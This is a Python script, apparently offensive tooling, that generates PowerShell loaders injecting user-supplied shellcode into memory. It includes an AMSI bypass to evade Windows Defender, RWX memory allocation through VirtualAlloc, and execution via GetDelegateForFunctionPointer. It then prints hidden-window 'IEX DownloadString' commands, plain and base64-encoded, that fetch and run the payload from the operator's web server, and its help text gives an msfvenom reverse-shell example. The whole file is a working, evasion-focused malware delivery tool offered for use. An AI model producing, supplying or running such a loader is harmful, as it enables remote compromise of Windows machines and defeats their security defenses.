#!/usr/bin/env python3
import sys
import os
import random
import string
import socket
import base64

# ------------------------------------------------------------------
# CONFIGURATION
# ------------------------------------------------------------------
# Port you will use for the Python Web Server
WEB_PORT = 80 

def get_local_ip():
    """Attempts to auto-detect the local IP address."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Does not actually connect, just determines route
        s.connect(('8.8.8.8', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = "127.0.0.1"
    finally:
        s.close()
    return IP

def random_string(length=6):
    """Generates a random filename to avoid patterns."""
    letters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(letters) for i in range(length))

def print_help():
    """Displays help information for the script."""
    help_text = """
{0}
PowerShell Shellcode Loader Generator
{0}

DESCRIPTION:
    This script generates a PowerShell payload that injects shellcode into memory
    using Adaptix C2 injection techniques. The generated payload includes:
    - AMSI bypass to evade detection
    - In-memory shellcode injection using GetDelegateForFunctionPointer
    - Base64-encoded download commands for obfuscation

USAGE:
    python3 {1} <path_to_shellcode.bin>
    python3 {1} -h, --help

ARGUMENTS:
    <path_to_shellcode.bin>    Path to the binary shellcode file to embed

OPTIONS:
    -h, --help                  Show this help message and exit

EXAMPLES:
    # Generate payload from shellcode file
    python3 {1} shellcode.bin

    # Generate payload from msfvenom output
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw > shell.bin
    python3 {1} shell.bin

OUTPUT:
    The script generates a randomly named .ps1 file (e.g., a8j2d.ps1) containing:
    - AMSI bypass code
    - Shellcode embedded as byte array
    - Memory allocation and injection code

    The script also provides:
    1. Direct download command (IEX DownloadString)
    2. Base64-encoded download command (for obfuscation)

WORKFLOW:
    1. Run this script with your shellcode file
    2. Start a web server on port {2} (default: 80)
       Example: sudo python3 -m http.server {2}
    3. Execute the provided PowerShell command on the target system
    4. The shellcode will be downloaded and executed in memory

TECHNICAL DETAILS:
    - Uses VirtualAlloc to allocate executable memory
    - Copies shellcode to allocated memory
    - Uses GetDelegateForFunctionPointer for execution (Adaptix C2 method)
    - Includes AMSI bypass to evade Windows Defender detection
    - Generates random filenames to avoid pattern detection

NOTES:
    - Ensure your web server is running before executing the payload
    - The script auto-detects your local IP address
    - Default web server port is {2} (configurable in script)
    - The generated PowerShell script is fileless (executes in memory)

{0}
""".format("="*60, os.path.basename(sys.argv[0]), WEB_PORT)
    print(help_text)

# ------------------------------------------------------------------
# POWERSHELL TEMPLATE (AMSI Bypass + Injection)
# ------------------------------------------------------------------
PS_TEMPLATE = """
$g = "Amsi"
$c = "Utils"
$ref = $g + $c
try {{
    $a = [Ref].Assembly.GetType("System.Management.Automation.$ref")
    $b = $a.GetField('amsiInitFailed','NonPublic,Static')
    $b.SetValue($null,$true)
}} catch {{}}

[Byte[]] $buf = {shellcode_bytes}

$Kernel32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {{
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
}}
public delegate IntPtr ShellcodeDelegate();
"@

$Win32 = Add-Type -TypeDefinition $Kernel32 -PassThru

$size = $buf.Length
$ptr = [Win32]::VirtualAlloc([IntPtr]::Zero, $size, 0x3000, 0x40)
if ($ptr -eq [IntPtr]::Zero) {{
    exit
}}
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, $size)
$f = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, [ShellcodeDelegate])
$f.Invoke()
"""

def main():
    # Check for help flag or no arguments
    if len(sys.argv) < 2 or (len(sys.argv) > 1 and sys.argv[1] in ['-h', '--help', 'help']):
        print_help()
        return

    input_file = sys.argv[1]
    
    # Generate random output filename (e.g., a8j2d.ps1)
    random_name = random_string() + ".ps1"
    
    if not os.path.exists(input_file):
        print(f"[!] Error: File '{input_file}' not found.")
        return

    print(f"[*] Reading shellcode from: {input_file}")
    
    try:
        with open(input_file, "rb") as f:
            raw_bytes = f.read()
    except Exception as e:
        print(f"[!] Error reading file: {e}")
        return

    # Convert binary to PowerShell hex format
    hex_array = ",".join([f"0x{byte:02X}" for byte in raw_bytes])

    # Inject into template
    final_script = PS_TEMPLATE.format(shellcode_bytes=hex_array)

    # Write final loader
    try:
        with open(random_name, "w") as f:
            f.write(final_script)
    except Exception as e:
        print(f"[!] Error writing output file: {e}")
        return

    # Get IP for the one-liner
    my_ip = get_local_ip()

    print("\n" + "="*60)
    print(f" SUCCESS! Payload Generated: {random_name}")
    print("="*60)
    
    print("\n[STEP 1] Start your Web Server here:")
    print(f"   sudo python3 -m http.server {WEB_PORT}")

    print("\n[STEP 2] RUN THIS ON TARGET (Direct Download):")
    print("-" * 80)
    print(f"powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://{my_ip}:{WEB_PORT}/{random_name}')\"")
    print("-" * 80)
    
    # Base64 encode the download command itself
    download_cmd = f"IEX (New-Object Net.WebClient).DownloadString('http://{my_ip}:{WEB_PORT}/{random_name}')"
    download_cmd_bytes = download_cmd.encode('utf-16-le')  # PowerShell -enc expects UTF-16LE
    download_cmd_base64 = base64.b64encode(download_cmd_bytes).decode('utf-8')
    
    print("\n[STEP 3] Base64 Encoded Download Command:")
    print("-" * 80)
    print(f"powershell -nop -w hidden -enc {download_cmd_base64}")
    print("-" * 80 + "\n")

if __name__ == "__main__":
    main()